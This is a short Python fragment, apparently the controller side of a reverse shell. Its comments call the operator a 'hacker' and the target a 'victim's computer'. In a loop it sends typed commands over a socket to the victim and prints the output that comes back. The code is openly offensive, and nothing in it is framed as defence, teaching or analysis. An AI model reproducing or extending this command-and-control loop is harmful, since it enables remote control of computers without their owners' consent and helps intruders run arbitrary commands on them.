while True: # sending commands and receiving outputs repeated until program is closed
    command = input('Enter Command : ') # wait for hacker to enter the command to run on victim's computer
    command = command.encode() # code command
    victim.send(command) # send command
    print('[+] Command sent')
    output = victim.recv(1024) # receive output from victim
    output = output.decode() # decode output
    print(f"Output: {output}")